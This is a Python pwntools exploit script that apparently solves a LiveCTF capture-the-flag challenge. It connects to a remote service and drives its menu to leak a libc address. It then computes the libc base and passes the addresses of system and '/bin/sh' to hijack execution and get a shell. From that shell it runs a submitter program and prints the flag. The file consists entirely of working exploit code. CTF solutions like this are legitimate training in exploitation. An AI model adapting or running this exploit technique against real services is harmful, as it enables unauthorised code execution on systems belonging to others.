#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
# context.log_level = "DEBUG"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

system_offset = 331104
binsh_offset = 1935000

r = remote(HOST, int(PORT))
# r = process("./handout/challenge")

r.sendlineafter(b"send?", b"0x3")
r.sendlineafter(b"want?", b"0x80")
r.sendlineafter(b"data?", b"0x0")

r.recvuntil(b"returned ")
leak = int(r.recvline().strip()[2:].decode(), 16)

r.sendlineafter(b"(0/1)?", "1")

libc_base = leak - 0x7ffff7e7abc7 + 0x7ffff7d91000 - 0x1000

r.sendlineafter(b"send?", b"0x6")
r.sendlineafter(b"want?", b"0x80")
r.sendlineafter(b"data?", hex(libc_base + system_offset).encode())
r.sendlineafter(b"(0/1)?", b"1")

r.sendlineafter(b"send?", b"0x6")
r.sendlineafter(b"want?", b"0x70")
r.sendlineafter(b"data?", hex(libc_base + binsh_offset).encode())
r.sendlineafter(b"(0/1)?", b"1")

r.sendlineafter(b"send?", b"0x7")
r.sendlineafter(b"want?", b"0x0")
r.sendlineafter(b"data?", b"0x0")

# print(hex(libc_base))

# pause()
r.sendlineafter(b"(0/1)?", b"0")

sleep(1)

r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
